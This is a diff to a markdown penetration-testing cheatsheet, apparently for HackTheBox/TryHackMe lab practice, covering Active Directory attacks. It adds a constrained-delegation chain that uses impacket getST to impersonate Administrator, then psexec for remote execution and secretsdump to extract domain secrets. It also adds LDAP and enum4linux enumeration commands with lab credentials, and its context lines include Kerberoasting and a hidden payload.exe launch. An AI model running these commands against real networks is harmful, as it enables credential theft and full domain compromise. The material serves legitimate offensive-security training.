@@ -106,6 +106,9 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [autobloodyAD](#autobloodyAD)
 - [bloodyAD](#bloodyAD)
 - [impacket](#impacket)
+- [ldapdomaindump](#ldapdomaindump)
+- [ldapsearch](#ldapsearch)
+- [enum4linux](#enum4linux)
 - [Metasploit](#Metasploit)
 - [smbclient](#smbclient)
 - [Burp Suite](#Burp-Suite)
@@ -3290,6 +3293,65 @@ impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-us
 or ( get all ) 
 impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
 
+
+# Exploit Constrained Delegation priv of user password-reset with oakley/DC.COOCTUS.CORP 
+impacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.175.192
+impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.48.166.13
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass DC.COOCTUS.CORP
+impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
+
+```
+## ldapdomaindump
+
+```
+# Query all Domain information and save to file
+ldapdomaindump 10.10.175.192 -u "COOCTUS\Visitor" -p 'GuestLogin!'
+
+```
+## ldapsearch
+
+```
+# Query all Domain information and save to file
+ldapsearch -x -b "DC=COOCTUS,DC=CORP" -D "COOCTUS\Visitor" -H ldap://10.10.175.192 -W > ldap_crocccrew.txt 
+
+# Discover the root partitions of a Domain using anonymity (Reconnaissance)
+ldapsearch -x -s base namingcontexts -H ldap://10.10.175.192  
+
+# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+
+# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+
+```
+## enum4linux
+
+```
+# Query full information with enum4linux-ng 
+enum4linux-ng -A 10.48.166.13 -oJ crocccrew_enum.json
+
+# Query all Domain information 
+enum4linux -a 10.48.166.13
+
+# User Enumeration 
+enum4linux -U 10.48.166.13
+
+# Share Enumeration
+enum4linux -S 10.48.166.13
+
+# Password Policy
+enum4linux -P 10.48.166.13
+
+# RID Cycling
+enum4linux -r 10.48.166.13
+
+# Using creds
+enum4linux -a -u "" -p "" 10.10.158.48
+enum4linux -a -u "guest" -p "" 10.10.158.48
+enum4linux -a -u "myrtleowe" -p "Passw@rd" 10.10.158.48
+
+
 ```
 ## Metasploit
 
@@ -3549,6 +3611,9 @@ xfreerdp /v:<IP_CUA_VM> /u:thm /p:Password1@ /d:lunar.eruca.com /dynamic-resolut
 
 # Command psh to start process hiden
 Start-Process -FilePath "C:\Windows\System32\inetsrv\payload.exe" -WindowStyle Hidden
+
+# Command RDP with rdesktop 
+rdesktop -g 100% 10.48.166.13
 
 ```
 ## Step to escal
